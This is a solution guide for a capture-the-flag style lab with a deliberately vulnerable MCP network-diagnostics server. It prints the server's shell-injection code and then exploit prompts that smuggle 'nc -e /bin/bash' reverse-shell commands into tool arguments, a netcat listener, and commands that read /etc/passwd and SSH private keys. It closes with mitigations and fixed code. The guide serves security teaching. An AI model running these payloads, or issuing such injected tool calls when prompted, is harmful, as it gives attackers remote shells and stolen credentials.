# Challenge 9: Remote Access Control - Solution Guide

## Vulnerability

This challenge demonstrates a remote access control vulnerability in an MCP server. The MCP server passes unvalidated input to system commands, allowing attackers to gain remote access to the victim's system.

## Solution

### Step 1: Reconnaissance

First, explore the server to understand what resources and tools are available:

1. Connect to the server at http://localhost:8009 using an MCP client
2. Examine the available resources and tools
3. Notice that there's a resource for network information (`network://info`) and tools for network diagnostics (`ping_host`, `traceroute`, `port_scan`, `network_diagnostic`, and `view_network_logs`)

### Step 2: Identify the Vulnerability

The vulnerability is in multiple tools that pass unvalidated input directly to shell commands:

1. The `ping_host` tool passes user input directly to a shell command:

```python
# VULNERABILITY: This tool passes user input directly to a shell command
# without proper validation, allowing command injection

# Vulnerable command construction
command = f"ping -c {count} {host}"

# Execute the command
result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
```

2. The `traceroute` tool has a similar vulnerability:

```python
# VULNERABILITY: This tool passes user input directly to a shell command
# without proper validation, allowing command injection

# Vulnerable command construction
command = f"traceroute {host}"
```

3. The `network_diagnostic` tool is extremely vulnerable as it allows specifying additional options:

```python
# VULNERABILITY: This tool passes user input directly to a shell command
# and even allows specifying additional options, making command injection trivial

# Construct the diagnostic command
# This is EXTREMELY vulnerable as it directly passes user input to the shell
# including arbitrary options
command = f"./network_diagnostic.sh {target} {options}"
```

### Step 3: Exploit the Vulnerability

There are multiple ways to exploit this vulnerability to gain remote access:

#### Method 1: Command injection with the `ping_host` tool

Use the `ping_host` tool with command injection to execute arbitrary commands:

```
Please ping the host "localhost; nc -e /bin/bash 192.168.1.100 4444" using the ping_host tool.
```

This will first ping localhost, then execute the netcat command to establish a reverse shell to the attacker's machine at 192.168.1.100 on port 4444.

#### Method 2: Command injection with the `network_diagnostic` tool

Use the `network_diagnostic` tool with command injection in the options parameter:

```
Please run a network diagnostic on "localhost" with options "; nc -e /bin/bash 192.168.1.100 4444" using the network_diagnostic tool.
```

This will execute the network diagnostic on localhost, then execute the netcat command to establish a reverse shell.

### Step 4: Set Up a Listener on the Attacker's Machine

On the attacker's machine, set up a listener to receive the reverse shell:

```
nc -lvp 4444
```

### Step 5: Execute the Exploit

Execute one of the exploit methods above. If successful, the victim's server will connect back to the attacker's machine, providing a shell with the permissions of the user running the MCP server.

### Step 6: Access Sensitive Information

Once you have shell access, you can explore the system and access sensitive information:

```
# List files in the current directory
ls -la

# View sensitive files
cat /etc/passwd
cat /home/user/.ssh/id_rsa

# Search for configuration files
find / -name "*.conf" -type f 2>/dev/null
```

## Mitigation Strategies

To prevent remote access control vulnerabilities:

1. **Validate and sanitize user input**: Implement strict validation for all user inputs that will be used in shell commands.

2. **Use allowlists for command parameters**: Define a specific set of allowed parameters rather than accepting arbitrary input.

3. **Avoid using shell=True**: When using subprocess functions, avoid setting shell=True to prevent shell injection.

4. **Use safer alternatives**: Instead of passing input to shell commands, use language-specific libraries or APIs.

5. **Implement proper error handling**: Ensure that error messages don't leak sensitive information.

Example of improved code for the `ping_host` tool:

```python
def ping_host(host: str, count: int = 4) -> str:
    """Ping a host to check connectivity."""
    try:
        # Validate input
        if not is_valid_hostname_or_ip(host):
            return "Error: Invalid hostname or IP address."
        
        if not (0 < count <= 10):
            return "Error: Count must be between 1 and 10."
        
        # Use a safer approach without shell=True
        result = subprocess.check_output(
            ["ping", "-c", str(count), host],
            stderr=subprocess.STDOUT
        )
        
        return f"Ping result:\n\n{result.decode()}"
    except subprocess.CalledProcessError as e:
        return f"Error executing ping: {e.output.decode()}"
    except Exception as e:
        return f"Error: {str(e)}"

def is_valid_hostname_or_ip(host: str) -> bool:
    """Validate if the input is a valid hostname or IP address."""
    # Implement proper validation logic
    # This is a simplified example
    import re
    
    # Check if it's a valid IP address
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ip_pattern, host):
        # Validate each octet
        octets = host.split('.')
        return all(0 <= int(octet) <= 255 for octet in octets)
    
    # Check if it's a valid hostname
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    return bool(re.match(hostname_pattern, host))
```

This improved implementation:
1. Validates that the host is a valid hostname or IP address
2. Uses subprocess without shell=True to prevent shell injection
3. Provides clear error messages for invalid input
